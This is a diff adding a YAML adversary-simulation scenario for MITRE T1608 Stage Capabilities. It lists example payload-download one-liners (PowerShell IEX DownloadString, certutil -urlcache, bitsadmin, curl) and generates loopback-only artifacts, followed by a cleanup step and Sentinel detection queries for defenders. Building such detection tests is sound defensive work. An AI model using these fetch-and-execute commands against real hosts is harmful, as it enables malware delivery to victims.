@@ -1,0 +1,88 @@
+id: T1608_stage_capabilities
+name: "Stage Capabilities"
+mitre_technique: "T1608"
+mitre_tactic: "resource-development"
+description: >
+  Adversaries upload malware, tools, or staged payloads to infrastructure they control
+  prior to targeting victims. This includes uploading to VPS servers, web services,
+  code repositories, or drive-by target pages. Detection focuses on web content
+  retrieval from adversary infrastructure and the use of LOLBins to download staged payloads.
+  Sub-techniques: T1608.001 Upload Malware | T1608.002 Upload Tool |
+  T1608.003 Install Digital Certificate | T1608.004 Drive-by Target |
+  T1608.005 Link Target | T1608.006 SEO Poisoning
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1608/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Technique context"
+    message: "T1608 — Stage Capabilities is a pre-compromise adversary-side technique"
+
+  - step: 2
+    type: marker
+    description: "Sub-technique coverage"
+    message: "Covers T1608.001 Upload Malware | T1608.002 Upload Tool | T1608.003 Install Cert | T1608.004 Drive-by Target | T1608.005 Link Target | T1608.006 SEO Poisoning"
+
+  - step: 3
+    type: exec_powershell
+    description: "Simulate PowerShell payload retrieval — common victim-side artifact of staged capability download"
+    command: |
+      Write-Host "[PAS] Simulating staged payload retrieval (loopback only — no real external traffic):"
+      Write-Host "  Common adversary staging retrieval methods:"
+      Write-Host "    powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://...')"
+      Write-Host "    certutil.exe -urlcache -split -f http://... payload.exe"
+      Write-Host "    bitsadmin.exe /transfer job /download http://... %TEMP%\payload.exe"
+      Write-Host "    curl.exe -o %TEMP%\payload.exe http://..."
+      Write-Host ""
+      Write-Host "  Generating Invoke-WebRequest artifact (loopback — connection refused expected):"
+      try {
+          Invoke-WebRequest -Uri "http://127.0.0.1/pas_staging_test" `
+              -TimeoutSec 1 -ErrorAction SilentlyContinue | Out-Null
+      } catch {}
+      Write-Host "  [PAS] HTTP GET artifact generated"
+
+  - step: 4
+    type: exec_powershell
+    description: "Simulate certutil LOLBin payload download — T1608 victim-side detection artifact"
+    command: |
+      Write-Host "[PAS] Generating certutil -urlcache artifact (loopback — will fail as expected):"
+      $outFile = "$env:TEMP\pas_certutil_test.txt"
+      & certutil -urlcache -split -f "http://127.0.0.1/pas_certutil_test" $outFile 2>&1 | Out-Null
+      Write-Host "  [PAS] certutil download attempt generated"
+
+  - step: 5
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 5
+
+  - step: 6
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — Invoke-WebRequest and certutil -urlcache artifacts should now be visible"
+
+  - step: 7
+    type: marker
+    description: "SEO poisoning control check"
+    message: "T1608.006 SEO Poisoning — CONTROL CHECK: Is Defender for Endpoint Web Content Filtering blocking newly registered or malicious domains?"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove certutil test artifact from TEMP"
+    command: |
+      Remove-Item "$env:TEMP\pas_certutil_test.txt" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS] Certutil artifact removed"
+
+analyst_checklist:
+  - "Process event: certutil.exe with -urlcache and -split arguments — primary LOLBin staging download indicator"
+  - "Process event: powershell.exe running Invoke-WebRequest or WebClient.DownloadString"
+  - "Network event: HTTP GET from certutil.exe or powershell.exe to an external or unexpected host"
+  - "Script block logging (Event ID 4104): Invoke-WebRequest or IEX download pattern visible"
+  - "Sentinel: DeviceProcessEvents | where FileName == 'certutil.exe' and ProcessCommandLine contains '-urlcache'"
+  - "Sentinel: DeviceProcessEvents | where FileName == 'powershell.exe' and ProcessCommandLine contains 'DownloadString' or 'Invoke-WebRequest'"
+  - "MDE alert: 'Suspicious use of certutil' or 'Potential payload download via LOLB'"
+  - "CONTROL CHECK: Is Defender for Endpoint Web Content Filtering enabled and blocking malicious/newly registered domains?"
